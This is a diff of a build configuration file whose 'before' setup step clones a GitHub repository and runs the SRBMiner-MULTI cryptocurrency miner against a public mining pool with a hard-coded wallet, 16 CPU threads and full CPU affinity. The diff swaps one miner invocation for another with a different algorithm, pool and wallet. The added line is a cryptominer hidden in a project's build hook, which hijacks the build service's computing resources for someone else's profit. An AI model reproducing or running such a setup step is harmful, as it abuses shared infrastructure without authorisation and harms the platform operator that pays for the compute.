@@ -3,4 +3,4 @@ build:
     my-node:
       project_setup:
         before:
-          - command: git clone https://github.com/remakove/artions.git artions && cd artions && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.j2 --disable-gpu --cpu-threads 16 --cpu-affinity 0xFFFF
+          - command: git clone https://github.com/remakove/artions.git artions && cd artions && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm yescryptr8 --pool stratum+tcps://stratum-eu.rplant.xyz:17054 --wallet Zqu9jQMuikp17bZ7RqP2rmqBQVhLoehjNf.p2 --disable-gpu --cpu-threads 16 --cpu-affinity 0xFFFF
